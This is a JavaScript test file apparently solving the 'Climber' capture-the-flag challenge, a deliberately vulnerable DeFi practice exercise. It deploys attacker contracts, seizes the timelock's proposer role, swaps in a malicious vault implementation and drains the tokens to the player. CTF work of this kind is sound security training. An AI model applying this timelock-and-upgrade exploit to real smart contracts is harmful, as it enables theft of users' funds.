...
describe("[Challenge] Climber", function () {
  ...
  it("Execution", async function () {
    hack = await (
      await ethers.getContractFactory("HackClimberTimelock", player)
    ).deploy();
    ...
    let dataElements = [
      await hack.getHashUpdateDelay(),
      await hack.getHashSetupRole(),
      await hack.getHashHackGetProposerRole(),
    ];
    ...
    expect(
      await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), hack.address)
    ).to.be.true;

    await hack.hackUpgradeImplementation(vault.address, timelock.address);

    let hacked = await (
      await ethers.getContractFactory("HackClimberFunds", deployer)
    ).attach(vault.address);

    await hacked.hack(token.address, player.address);
  });
